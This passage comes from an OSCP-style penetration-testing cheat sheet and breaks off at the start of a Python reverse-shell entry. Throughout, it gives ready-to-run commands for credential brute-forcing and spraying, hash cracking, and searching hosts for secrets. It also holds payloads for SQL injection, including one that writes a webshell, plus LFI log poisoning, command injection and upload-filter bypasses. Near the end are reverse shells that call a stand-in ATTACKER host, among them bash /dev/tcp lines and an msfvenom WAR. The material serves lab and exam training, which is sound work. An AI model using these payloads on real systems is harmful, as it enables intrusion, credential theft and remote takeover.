gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50
```
Fallback with response filtering (ffuf):
```bash
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.bak,.old,.zip -mc all -fc 404 -t 60
```

> [!note]
> - Extension guide: PHP box → `php`; IIS → `aspx,asp`; Tomcat → `jsp`. Always add `bak,old,zip` to catch backup files that leak source/creds.
> - ffuf filtering: `-mc all` matches every status code, then `-fc 404` hides not-founds; use `-fs <size>` to hide a repeating default-page size.

### Virtual host / subdomain discovery

`TRIGGER:` the server responds differently depending on the `Host` header, or you've learned a domain name. Different vhosts often serve entirely different apps.

```bash
ffuf -u http://$IP -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
```

> [!note]
> - Set `-fs <default_size>` to the byte-size of the default response so only *different* vhosts show up.
> - **Add every discovered vhost to `/etc/hosts`** or your browser/tools can't resolve it.
> - `gobuster vhost -u http://<domain> -w <wl> --append-domain` is the equivalent in gobuster.

### Parameter discovery

Find hidden GET/POST parameters that expose LFI, SQLi, or command-injection sinks the visible UI doesn't show.

```bash
ffuf -u "http://$IP/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>
```

> [!note]
> A newly discovered parameter that changes the response is your lead into [§3](#3--web-application-testing--foothold) (LFI/SQLi/cmdi).

### CMS-specific scanners

`TRIGGER:` whatweb identifies a known CMS. Purpose-built scanners enumerate users, plugins, and known-vulnerable versions far faster than generic fuzzing.

WordPress:
```bash
wpscan --url http://$IP --enumerate u,ap,at --plugins-detection aggressive
```
WordPress with an API token (fuller vuln data) + skip TLS errors:
```bash
wpscan --url http://$IP --disable-tls-checks --api-token <token>
```
Drupal:
```bash
droopescan scan drupal -u http://$IP
```
Joomla:
```bash
joomscan -u http://$IP
```

> [!note]
> Results route onward — a login page → [§2.3](#23--credential-enumeration) + [§3](#3--web-application-testing--foothold); an upload form → [§3](#3--web-application-testing--foothold); a version string → `searchsploit`. WordPress: if authenticated, editing a plugin/theme PHP (e.g. `akismet.php`, `themes/<t>/404.php`) with a webshell is the classic RCE ([§3.3](#33--file-upload--webshell)).

## 2.3 — Credential Enumeration

**TRIGGER:** (a) a login interface, (b) a username list, or (c) **any** credential at all → spray it *everywhere*. Credential reuse is the exam's single most reliable mechanic.

### Protocol brute / spray with Hydra + CME

Use when you have a login interface and a user/password list. Read the login form first so you get the field names and failure string right.

HTTP POST form:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
```
HTTP GET (basic auth):
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get /admin
```
FTP:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 4
```
SSH (keep threads low — SSH throttles):
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
```
RDP:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://$IP
```
SMB (via CME):
```bash
crackmapexec smb $IP -u users.txt -p /usr/share/wordlists/rockyou.txt
```
WinRM (via CME):
```bash
crackmapexec winrm $IP -u users.txt -p /usr/share/wordlists/rockyou.txt
```

> [!note]
> - `^USER^` / `^PASS^` are substitution markers Hydra fills from your lists.
> - `F=<string>` is the text on a *failed* login; Hydra treats anything without it as success. Use `S=<success string>` when that's easier to match.
> - Keep SSH/RDP threads low (`-t 4`) — they lock or drop under heavy parallelism.
> - `ffuf` is a good fallback when Hydra mangles a complex form: `ffuf -u http://$IP/login -X POST -d 'user=admin&pass=FUZZ' -w /usr/share/wordlists/rockyou.txt -fc 200`.

### Spray found creds across the whole network

The core loop: the instant you get one credential, test it against every host and protocol before doing anything else.

SMB across a subnet:
```bash
crackmapexec smb 10.10.10.0/24 -u user -p 'Pass123' --continue-on-success
```
WinRM across a subnet:
```bash
crackmapexec winrm 10.10.10.0/24 -u user -p 'Pass123'
```
MSSQL across a subnet:
```bash
crackmapexec mssql 10.10.10.0/24 -u user -p 'Pass123' --local-auth
```
Validate a single credential (or hash) fast:
```bash
crackmapexec smb $IP -u user -p 'Pass123'
crackmapexec smb $IP -u user -H <NTLM> --local-auth
```

> [!note]
> - In CME output, `+` means the credential is valid; `Pwn3d!` means it grants admin/code-execution on that host — an immediate lateral-movement target.
> - `--continue-on-success` keeps going after the first hit so you map *every* box the cred works on.
> - `--local-auth` authenticates against the **local** SAM (not the domain) — use it for local admin reuse across standalones, and to avoid domain lockout while spraying a hash.
> - Also try the password as the username, and username == password — lazy admins are common.

### Offline hash cracking — hashcat (GPU)

`TRIGGER:` you've recovered a hash (from a dump, a file, or a roast). Identify it, then crack with the right mode.

Identify the hash type:
```bash
hashid '<hash>'
```
Crack with hashcat (pick the mode — see notes):
```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
```
Add rules for mutations when a straight wordlist fails:
```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> [!note]
> - Common hashcat modes: `0` MD5 · `100` SHA1 · `1000` NTLM · `1800` sha512crypt · `3200` bcrypt · `5600` NetNTLMv2 · `13100` Kerberoast TGS · `18200` AS-REP. (Full list: hashcat example-hashes page in [§9.2](#92--reference-sites-bookmark--offline-copies-where-possible).)
> - Format-specific "2john" helpers turn files into crackable hashes: `zip2john`, `ssh2john`, `keepass2john`, `office2john`, `rar2john`.
> - **Discipline:** the moment a password cracks, stop and spray it everywhere (the loop above) before continuing.

### Offline hash cracking — John (CPU fallback)

Use John when hashcat is off the table — no GPU, a VM without GPU passthrough, or a CPU-only box. John is genuinely better than hashcat on CPU and handles the odd formats the `*2john` tools produce.

Wordlist mode, auto-detect the format:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Force a format when auto-detect guesses wrong:
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Wordlist + rules (the CPU equivalent of hashcat rules):
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo hash.txt
```
Show cracked results later:
```bash
john --show hash.txt
```
Pure brute force (no wordlist) as a last resort:
```bash
john --incremental hash.txt
```

> [!note] Common `--format` values you'll actually use
> - `NT` (NTLM) · `netntlmv2` (Responder captures) · `krb5tgs` (Kerberoast) · `krb5asrep` (AS-REP) · `sha512crypt` (Linux `/etc/shadow`) · `md5crypt`
> - Run `john --list=formats` if unsure. Combine `/etc/passwd` + `/etc/shadow` with `unshadow` before cracking Linux hashes: `unshadow passwd shadow > crack.me`.

## 2.4 — File & Share Enumeration

**TRIGGER:** any readable FTP/SMB/NFS share, any shell (loot the filesystem as the new user), or any readable web root. You're hunting for credentials, keys, and configs.

### Pull a share recursively (SMB)

Grab an entire readable share in one shot rather than clicking through it.

```bash
smbclient //$IP/share -N -c 'recurse ON; prompt OFF; mget *'
```
See READ/WRITE perms and spot juicy paths across all shares:
```bash
smbmap -H $IP -u user -p pass -R
```

> [!note]
> `-R` recurses; the perm column tells you instantly where you can *write* (webshell/upload opportunities) vs only read. On a domain, look specifically for `Groups.xml` in shares (GPP password → `gpp-decrypt`, see the Windows-creds table below).

### Mount and read NFS exports

```bash
showmount -e $IP
```
```bash
sudo mount -t nfs $IP:/home /tmp/nfs -o nolock
```

> [!note]
> Browse the mount for keys/configs; remember the `no_root_squash` escalation angle ([§5.2](#52--nfs-no_root_squash-worked-exploit)).

### Where Linux creds hide

| Location | What's there |
|---|---|
| `/etc/passwd` + `/etc/shadow` | user list; hashes **if shadow is readable** (crack with `unshadow`+John) |
| `~/.bash_history`, `.zsh_history`, `.mysql_history`, `.psql_history` | passwords typed on command lines |
| `~/.ssh/` (`id_rsa`, `authorized_keys`, `known_hosts`) | keys + which hosts they reach |
| web configs: `wp-config.php`, `config.php`, `.env`, `settings.py`, `database.yml`, `.git-credentials` | DB/app creds |
| `/var/www/`, `/opt/`, `/home/*/` | app source with hardcoded secrets |
| `/var/backups/`, `*.bak`, `*.old` | old copies of the above |
| `/var/mail/<user>` | messages (sometimes creds) |

Grep common dirs for secret-like strings:
```bash
grep -rniE 'passw|pwd|secret|api[_-]?key|token|connectionstring' /var/www /opt /home /etc 2>/dev/null
```
Find keys, KeePass DBs, env files, backups:
```bash
find / \( -name "id_rsa" -o -name "*.kdbx" -o -name ".env" -o -name "*.bak" \) 2>/dev/null
```
Broad "which files mention password" sweep:
```bash
find / -name "*.txt" -o -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -il password 2>/dev/null
```
Recursively grep a specific directory for a keyword:
```bash
grep -Ri "password" /var/www/ 2>/dev/null
```

> [!note]
> `2>/dev/null` hides permission-denied noise so real hits stand out. Read `~/.bash_history` and other users' histories first — passwords get typed on command lines constantly.

### Where Windows creds hide

| Location | What's there |
|---|---|
| `C:\Windows\Panther\Unattend.xml`, `Autounattend.xml`, `sysprep.xml` | deployment passwords (often base64) |
| `web.config`, `appsettings.json`, `*.config` | connection strings |
| `\\<DC>\SYSVOL\...\Groups.xml` (GPP `cpassword`) | reversible domain creds |
| `%USERPROFILE%\...\ConsoleHost_history.txt` | PowerShell history |
| `*.kdbx` (KeePass), `*.ppk` (PuTTY), mRemoteNG `confCons.xml` | vaults / keys / saved sessions |
| Registry: `Winlogon` DefaultPassword, PuTTY/WinSCP/VNC sessions, autologon | stored creds |
| `cmdkey /list` | saved credentials → reuse with `runas /savecred` |

Fastest first pass (recursive, case-insensitive):
```cmd
findstr /si password *.xml *.ini *.txt *.config *.php 2>nul
```
Hunt cred stores and scripts with PowerShell:
```powershell
Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.kdbx,unattend.xml -EA SilentlyContinue | Select-String -Pattern "password|pwd|cpassword"
```
Registry sweep (catches autologon / app-stored creds the file search misses):
```cmd
reg query HKLM /f password /t REG_SZ /s
```
GPP passwords in SYSVOL (domain):
```cmd
findstr /S /I cpassword \\<DC>\SYSVOL\*.xml
```
Decrypt a recovered GPP blob:
```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

> [!example] mRemoteNG stored passwords
> mRemoteNG saves connection passwords (reversibly) in `C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml`. Pull that file and decrypt:
> ```bash
> python3 mremoteng_decrypt.py -s "<encrypted-string>"
> ```

> [!note]
> - `/s` recurses, `/i` is case-insensitive; `-EA SilentlyContinue` suppresses PowerShell access errors.
> - Always decode base64 blobs in unattend files, and run `gpp-decrypt <blob>` on any `cpassword`.
> - **GPP cpassword** is encrypted with a key Microsoft *published*, so any `cpassword` blob in SYSVOL is trivially reversible — a classic domain-wide credential leak.

## 2.5 — SNMP / LDAP / RPC / Misc + MASTER ROUTING TABLE

### SNMP — 161/udp

`TRIGGER:` UDP 161 open. SNMP leaks users, running processes (sometimes with credentials on the command line!), and listening ports — a lot of free recon.

Find a valid community string first:
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
```
Dump everything:
```bash
snmpwalk -v2c -c public $IP
```
Enumerate Windows usernames specifically:
```bash
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25
```
Enumerate running processes (may leak cmdline creds):
```bash
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2
```
Prettified summary:
```bash
snmp-check $IP -c public
```

> [!note]
> - `public` (read) and `private` (write) are the most common community strings; `onesixtyone` brute-forces others.
> - The numeric OIDs are just subtrees — usernames and process lists are the two most useful.

### LDAP — 389 / 636 / 3268 / 3269 (command reference)

`TRIGGER:` port 389 open (a DC). An anonymous bind sometimes dumps the whole directory.

Find the base DN:
```bash
ldapsearch -x -H ldap://$IP -s base namingcontexts
```
Anonymous full dump (base DN from the previous command):
```bash
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=com"
```
Authenticated, filtered to users + the attributes that leak creds:
```bash
ldapsearch -x -H ldap://$IP -D 'user@corp.com' -w 'pass' -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName description
```
Pull just usernames (clean list for spraying/roasting):
```bash
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=com" "(&(objectclass=user))" sAMAccountName | grep sAMAccountName | cut -d' ' -f2
```
Enumerate the password policy over LDAP:
```bash
ldapsearch -x -H ldap://$IP -b "DC=corp,DC=com" | grep -m1 -B10 pwdHistoryLength
```

> [!note]
> - `-x` is simple (anonymous) auth; the base DN from the first command goes into `-b`.
> - Pull the `description` and `info` attributes specifically — creds hide there.
> - `(userAccountControl:1.2.840.113556.1.4.803:=8388608)` filters for password-not-required accounts.
> - `windapsearch --dc-ip $IP -u user@corp.com -p pass -U` is the friendlier wrapper. Then continue in [§7](#7--active-directory-attacks).

### RPC — 135 / 139 / 593

`TRIGGER:` RPC/SMB reachable. A null RPC session can enumerate domain users and groups with no credentials.

Null-session connect:
```bash
rpcclient -U "" -N $IP
```
Authenticated connect:
```bash
rpcclient -U 'user%pass' $IP
```
High-value in-session commands:
```rpcclient
enumdomusers                 -- all domain users (+ RIDs)
enumdomgroups                -- all groups
queryuser <RID>              -- detail on one user (last logon, flags, description!)
queryuser 0x457              -- (RID can be hex)
querygroupmem <group-RID>    -- who's in a group
lookupnames <user>           -- name -> SID
lookupsids <SID>             -- SID -> name (RID-cycle usernames)
getdompwinfo                 -- password policy (lockout!) BEFORE spraying
querydominfo                 -- domain / server role summary
enumprivs                    -- privileges
createdomuser / setuserinfo  -- if you have write rights
```

> [!example] rpcclient one-liner user spray (no lockout filter noise)
> Validate a password across a userlist through rpcclient, showing only hits:
> ```bash
> for u in $(cat users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP 2>/dev/null | grep Authority; done
> ```

> [!note]
> The `description` field from `queryuser` is a classic place admins leave passwords. Run `getdompwinfo` **before** any spray so you know the lockout threshold.

---

## MASTER ROUTING TABLE — *finding → next action*

| You observed… | Do this / go to |
|---|---|
| Port 21 FTP | anon login → [§2.4](#24--file--share-enumeration) loot; FTP==webroot → [§3](#3--web-application-testing--foothold) |
| Port 22 SSH + key/creds | [§2.1](#ssh--22); `chmod 600` key; `ssh2john` if passphrased |
| Port 25 SMTP | `smtp-user-enum` → userlist → [§2.3](#23--credential-enumeration) |
| Port 53 / a domain | `dig axfr`; names to /etc/hosts |
| Port 80/443/8080 | [§2.2](#22--web-enumeration) → [§3](#3--web-application-testing--foothold) |
| **Port 88 Kerberos** | **It's a DC → [§7](#7--active-directory-attacks)** |
| Port 139/445 SMB | null shares/users → [§2.3](#23--credential-enumeration)/[§2.4](#24--file--share-enumeration); ms17-010 → [§4](#4--initial-access--exploitation) |
| Port 161/udp SNMP | community strings → snmpwalk → [§2.3](#23--credential-enumeration) |
| Port 389 LDAP | anon bind dump → [§2.5](#ldap--389--636--3268--3269-command-reference) → [§7](#7--active-directory-attacks) |
| Port 1433 MSSQL | `sa` → `xp_cmdshell` RCE → [§4](#4--initial-access--exploitation) |
| Port 2049 NFS | `showmount -e`; no_root_squash → [§5.2](#52--nfs-no_root_squash-worked-exploit) |
| Port 3306 MySQL | default/blank root → [§2.3](#23--credential-enumeration) |
| Port 3389 RDP + creds | `xfreerdp` GUI |
| Port 5432 PostgreSQL | `postgres:postgres`; superuser → RCE → [§4](#4--initial-access--exploitation) |
| Port 5985 WinRM + creds/hash | `evil-winrm` → [§4](#4--initial-access--exploitation) |
| **A login page** | default creds → manual SQLi bypass [§3](#30--sql-injection-manual) → hydra [§2.3](#23--credential-enumeration) |
| **An upload form** | webshell upload → [§3.3](#33--file-upload--webshell) |
| `?param=file` / `include(` | LFI/RFI → RCE → [§3.1](#31--lfi--rfi--path-traversal) |
| **Any credential, anywhere** | **SPRAY everywhere → [§2.3](#23--credential-enumeration)** |
| An old service version | `searchsploit <svc> <ver>` → [§3.5](#35--known-cve-triage)/[§4](#4--initial-access--exploitation) |
| `id_rsa`/`.kdbx`/`.env` | crack/use → [§2.3](#23--credential-enumeration) / [§5](#5--privilege-escalation-linux) / [§6](#6--privilege-escalation-windows) |
| Low-priv shell (Linux) | [§5](#5--privilege-escalation-linux) |
| Low-priv shell (Windows) | **`whoami /priv` first** → [§6](#6--privilege-escalation-windows) |
| `SeImpersonate`/`SeAssignPrimaryToken` | **Potato → SYSTEM → [§6.1](#61--token-abuse-the-potato-family)** |
| Box is domain-joined | [§7](#7--active-directory-attacks) |
| Owned a box, need next subnet | [§11](#112--port-forwarding--tunneling--when-to-use-which) pivot/tunnel |

---

# 3 — Web Application Testing → Foothold

**Scope.** Turn web attack surface ([§2.2](#22--web-enumeration)) into a shell. **sqlmap is `[BANNED]` — everything here is manual.** Ordered by exam frequency. Keep Burp **Free** open to intercept, tamper, and repeat requests.

## 3.0 — SQL Injection (manual)

`TRIGGER:` any parameter or login field that touches a database; a single `'` changes the response or throws an error. These are grouped payload lists on purpose — you'll try them as sets against one injection point.

**Detection — does the parameter break?** Feed these one at a time and watch for errors or behavioral differences:
```sql
'                     -- error?  (single quote breaks the query)
''                    -- back to normal? confirms quote context
' OR '1'='1           -- classic true
1' AND '1'='1  vs  1' AND '1'='2     -- boolean differential (page differs = injectable)
1 AND 1=1  vs  1 AND 1=2             -- numeric context (no quotes)
1+1                                  -- resolves to 2? numeric reflection
'; WAITFOR DELAY '0:0:5'--           -- MSSQL time-based (blind)
' OR SLEEP(5)-- -                    -- MySQL time-based (blind)
' || pg_sleep(5)-- -                 -- Postgres time-based
```

> [!note]
> The boolean-differential pair is the key diagnostic — if `=1` and `=2` render differently, the input reaches the query. Time-based payloads are for *blind* cases where you see no output but a 5-second delay confirms execution.

**Auth bypass — log in without a password.** Try these in the username field:
```sql
' OR 1=1-- -            admin'-- -            admin'#            ' OR '1'='1'-- -
' OR 1=1 LIMIT 1-- -    ') OR ('1'='1         admin' OR 1=1-- -
```

> [!note]
> These comment out the password check or make the WHERE clause always true. `admin'-- -` logs in as a *specific* known user by truncating the query after the username.

**UNION extraction — pull data out (in-band, the workhorse):**
```sql
' ORDER BY 5-- -                                   -- find column count (increment till error)
' UNION SELECT 1,2,3,4,5-- -                        -- find which columns reflect on the page
' UNION SELECT 1,@@version,database(),user(),5-- -  -- MySQL: version/db/user
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(user,0x3a,password),3,4,5 FROM users-- -
-- dump MySQL account hashes:
' UNION SELECT 1,group_concat(user,0x3a,authentication_string),3,4,5 FROM mysql.user-- -
-- if column count mismatches, pad with NULLs:  ' UNION SELECT NULL,NULL,NULL-- -
```

> [!note]
> The workflow is ordered — first `ORDER BY` to count columns, then a numbered `UNION SELECT` to see which columns echo on the page, then replace those numbers with real queries. `information_schema` is the map of every table and column; `group_concat` collapses many rows into one reflected cell.

**Error-based — when UNION output isn't visible:**
```sql
-- MySQL extractvalue:
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
-- MSSQL cast error leaks value:
' AND 1=CONVERT(int,(SELECT @@version))-- -
```

> [!note]
> These deliberately trigger a database error that *contains* your queried value in the error message — useful when the page shows SQL errors but no result rows.

**SQLi → RCE / file operations:**
```sql
-- MSSQL command exec:
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami'-- -
-- MySQL read a local file:
' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -
-- MySQL write a webshell (needs FILE priv + writable webroot + secure_file_priv off):
' UNION SELECT "<?php system($_GET['c']);?>",2 INTO OUTFILE '/var/www/html/sh.php'-- -
```

> [!note]
> MSSQL's `xp_cmdshell` gives OS command execution as the DB service account (frequently high-privileged). MySQL `LOAD_FILE` reads files the DB user can access; `INTO OUTFILE` writes a webshell when FILE privilege and a known writable webroot line up (often blocked by `secure_file_priv`).

**Filter / WAF bypass tricks — when keywords get stripped or blocked:**
```sql
-- comments to break keyword matching:
UN/**/ION SE/**/LECT      or   /*!50000UNION*/ /*!50000SELECT*/
-- case variation:            UnIoN SeLeCt
-- encode the quote/space:    %27  %20  %09(tab)  %0a(newline)  +   /**/
-- double-URL-encode:         %2527
-- inline whitespace swaps:   UNION(SELECT(1),2)     -- parentheses instead of spaces
-- comment terminators:       -- -   #   ;%00
-- "OR" filtered -> use ||    ; "=" filtered -> use LIKE or <>
```

> [!tip] Burp workflow
> Filters usually match on exact keywords/characters, so the game is expressing the same query in a form the filter doesn't recognize but the database still parses. Capture the request → Repeater → mutate the injection point → watch response length/status. Save the raw request to `request.txt` for your report (you paste requests + output, since sqlmap is banned).

## 3.1 — LFI / RFI / Path Traversal

`TRIGGER:` parameters like `?page=`, `?file=`, `?include=`, `?template=`, `?lang=`; the response content changes with the path you supply. Grouped payload lists — try them as a set against one parameter.

**Read files (traversal):**
```
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00            (null byte — legacy PHP < 5.3.4)
?page=..%2f..%2f..%2fetc%2fpasswd          (URL-encoded slashes)
?page=%252e%252e%252f                      (double-encoded ../ )
?page=/etc/passwd                          (absolute)
?page=....\\....\\windows\win.ini          (Windows)
```

> [!note]
> Start with plain `../` traversal to `/etc/passwd` (proof the bug exists), then escalate to the encoded variants only if a filter strips your `../`. `win.ini` is the Windows equivalent proof-file.

**PHP wrappers — read source and grab creds from configs:**
```
?page=php://filter/convert.base64-encode/resource=config.php     -> base64-decode locally
?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index          -> read the app source
```

> [!note]
> A raw `include` of a `.php` file *executes* it (you see nothing). The base64 filter makes PHP hand you the file *contents* instead, which you decode locally to read source — that's how you pull database credentials out of `config.php`.

**LFI → RCE — log poisoning (the exam-relevant escalation):**
```
1) Poison a log you can write to and then include:
   - Send a request with PHP in the User-Agent, e.g.  User-Agent: <?php system($_GET['c']); ?>
   - Then include the log:   ?page=/var/log/apache2/access.log&c=id
   - Common targets: /var/log/apache2/access.log, /var/log/auth.log (SSH: put PHP in the username you try),
     /var/log/vsftpd.log, /var/log/nginx/access.log, /var/log/nginx/error.log
2) /proc/self/environ — if readable, a PHP User-Agent lands in the environment and executes when included.
3) PHP session file — seed a value into your session, then include /var/lib/php/sessions/sess_<PHPSESSID>.
4) /var/mail/<user> — SMTP a message containing PHP, then include the mailbox.
```

> [!note]
> Each route gets *your* PHP written somewhere the vulnerable `include()` will later read, turning file-read into code-execution. Access-log poisoning via the User-Agent is the most common and reliable on OSCP-style boxes. Detailed PoC steps live on HackTricks/PayloadsAllTheThings ([§9.2](#92--reference-sites-bookmark--offline-copies-where-possible)); this is the map of which to reach for.

**RFI (only when `allow_url_include=On`):**
```
?page=http://ATTACKER/shell.txt        (host a file the target fetches and executes)
```

> [!note]
> Far rarer than LFI on modern targets since remote includes are off by default, but trivial when enabled — the target pulls and runs a file you host.

## 3.2 — Command Injection

`TRIGGER:` input that gets reflected into a system call — ping/nslookup tools, file converters, filename fields, export features.

**Injection separators — chain your command onto the intended one:**
```
;id      |id      `id`      $(id)      && id      || id      %0aid
```

> [!note]
> The separator ends (or side-channels) the app's intended command and starts yours. `;` and `&&` chain sequentially; backticks and `$( )` substitute command output; `%0a` (newline) sometimes slips past filters that block `;` and `&`.

**Confirm blind injection (no visible output) out-of-band:**
```
; ping -c1 ATTACKER
; nslookup <unique>.ATTACKER
```

> [!note]
> When the app shows you nothing, prove execution by making the target reach *out* to you — watch `tcpdump`/your listener for the ping or DNS lookup.

**Bypass tricks when characters are filtered:**
```
w'h'o'a'm'i        (quotes broken through the word)
who$@ami           (empty variable expansion)
;cat$IFS/etc/passwd   ($IFS as a space substitute)
```

> [!note]
> These keep the command valid to the shell while defeating naive keyword/space filters — the shell strips the quotes/`$@` and `$IFS` expands to whitespace.

## 3.3 — File Upload → Webshell

`TRIGGER:` any upload feature. The goal is to upload something the server will execute, then browse to it. The minimal test webshell is a one-liner that runs a command from a query parameter:
```php
<?php system($_GET['cmd']); ?>
```
The real work is defeating the upload filter, so focus there:

**Filter bypasses (try in order):**
```
alternate extensions:   .phtml .php3 .php4 .php5 .php7 .phar .pht .inc   (still run as PHP)
double extension:       shell.jpg.php   shell.php.jpg   (server mis-parses which half counts)
case variation:         shell.PhP  shell.pHtml
trailing chars:         shell.php%00.jpg   shell.php.   shell.php;.jpg
magic bytes:            prepend a real image header so a content check passes
Content-Type tamper:    in Burp, set Content-Type: image/png while the body stays script
.htaccess trick:        upload an .htaccess mapping a benign extension to the PHP handler
```

> [!example] Magic-byte bypass (image content-check)
> Prepend PNG/GIF magic bytes so a filter that validates file *content* is fooled, while the `.php` still executes:
> ```bash
> echo -ne '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0d\x49\x48\x44\x52' > shell.php.jpg
> cat webshell.php >> shell.php.jpg
> ```
> (`GIF89a;` as a plain-text prefix at the top of the file works for GIF checks too.)

> [!note]
> Upload filters check one of three things — the extension, the MIME/Content-Type, or the file's magic bytes. Each row above defeats one of those. After a successful upload, find where the file landed (feroxbuster the uploads directory), browse to it to confirm execution, then use it to pull a proper reverse shell ([§4](#4--initial-access--exploitation)). For IIS use `.aspx` (or a `web.config`/`.master` RCE), for Tomcat `.jsp`/`.war`.

## 3.4 — Exposed admin panels / default creds

`TRIGGER:` `/admin`, `/manager`, `/phpmyadmin`, printer/router/appliance UIs, dev consoles. These often ship with known defaults or have a documented path to code execution.

> [!example] Tomcat manager → WAR shell
> With manager access (default creds like `tomcat:tomcat`, `tomcat:s3cret`), deploy a JSP payload as a WAR and browse to it:
> ```bash
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f war -o shell.war
> # upload shell.war via /manager/html, then:
> curl http://$IP:8080/shell/
> ```
> Reverse-proxy path-traversal to reach a locked-down manager: `http://$IP/<app>/..;/manager/html`.

> [!note] Common panels → route to a shell
> - **Tomcat `/manager/html`** → WAR deploy (above) — JSP runs on the server.
> - **Jenkins** → the Script Console runs Groovy on the server directly — instant execution if you can reach it.
> - **phpMyAdmin** → the SQL tab can read/write files (subject to DB privileges), i.e. a route to a webshell or file read.
> - **Always try vendor defaults** (`admin/admin`, `tomcat/tomcat`, `root/root`, product-specific) — SecLists' Default-Credentials directory is organized by product.

## 3.5 — Known-CVE triage

`TRIGGER:` any version string from [§2](#2--reconnaissance--enumeration). Turn "I know the version" into "I have a working exploit."

Search Exploit-DB locally:
```bash
searchsploit <product> <version>
```
Copy an exploit into your working dir:
```bash
searchsploit -m <id>
```
Read it before running it:
```bash
searchsploit -x <id>
```

> [!warning]
> **Always read a public exploit before running it** — fix the `RHOST`/`LHOST`/paths/offsets, understand what it does, and confirm it's not going to trash the box. Prefer manual PoCs over Metasploit on the exam (remember the one-MSF-target rule, [§0.1](#01--tool-restrictions--read-this-it-cost-you-before)). A curated list of the classics you'll actually reach for is in [§4.2](#42--famous-exploits-youll-actually-reach-for).

## 3.6 — Other injection classes (quick reference)

`TRIGGER:` you've exhausted the common paths above and the app takes structured input (XML, templates, serialized objects).

**XXE — the app parses XML you control:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<element>&xxe;</element>
```

**SSTI — template injection (test, then escalate):**
```
{{7*7}}      -> 49  means a template engine is evaluating your input (Jinja2/Twig/etc.)
${7*7}       -> 49  (Java/EL-style engines)
```

> [!note]
> - **XXE** turns an XML parser into a file-reader (and sometimes SSRF/RCE); swap the `SYSTEM` URI to read configs.
> - **SSTI** is engine-specific once confirmed — Jinja2 has a well-known `__globals__`→`os.popen` chain to RCE (WAF-avoiding payloads on PayloadsAllTheThings). **On OSCP, treat SSTI as a rabbit-hole signal unless `{{7*7}}` clearly returns `49`** — confirm before investing time.

---

# 4 — Initial Access / Exploitation

**Scope.** Convert a confirmed vuln into an interactive shell, then stabilize ([§11](#110--shell-stabilization)) and grab `local.txt`.

## 4.0 — Reverse shells

`TRIGGER:` you have code execution and need an interactive shell back. **Start the listener first, then trigger the payload.**

Catch the shell (rlwrap gives you arrow keys and history):
```bash
rlwrap nc -lvnp 443
```

> [!tip] Choosing the shell — decision tree
> - **Linux, bash present** → the `/dev/tcp` bash shell. Cleanest, no dependencies.
> - **Minimal Linux (Alpine, slim Docker, embedded)** → **`/bin/sh` not `/bin/bash`.** These ship `dash`/`busybox` as `sh` and often have *no* bash — a bash payload just errors. `sh -i` works everywhere.
> - **Got Python?** → the Python PTY shell — the only one-liner that gives a proper TTY out of the gate ([§11](#110--shell-stabilization) stabilization is then trivial).
> - **No Python, but Perl/Ruby present** → use those as the fallback interpreter.
> - **PHP app (webshell, LFI, upload)** → a PHP reverse shell, because you already have PHP execution.
> - **Windows** → PowerShell (Base64-encoded to dodge quoting hell), or drop `nc.exe`.
> - **File-upload vuln** → upload a revshell *file matching the stack* (`.php`/`.aspx`/`.jsp`), then browse to it to trigger.
> - **Target can't reach back out (egress filtered)** → **bind** shell (target listens, you connect in) instead of reverse.
> - **RCE mangles `|`, `<`, `>`?** → use a Base64-encoded payload: `echo -e "<b64>" | base64 -d | bash`, or a Python one-liner (no pipes/redirects).

bash — full features, needs bash installed:
```bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1
```
sh — universal, use on minimal hosts where bash is absent:
```bash
sh -i >& /dev/tcp/ATTACKER/443 0>&1
```
Python — the one that gives a real TTY immediately:
```bash
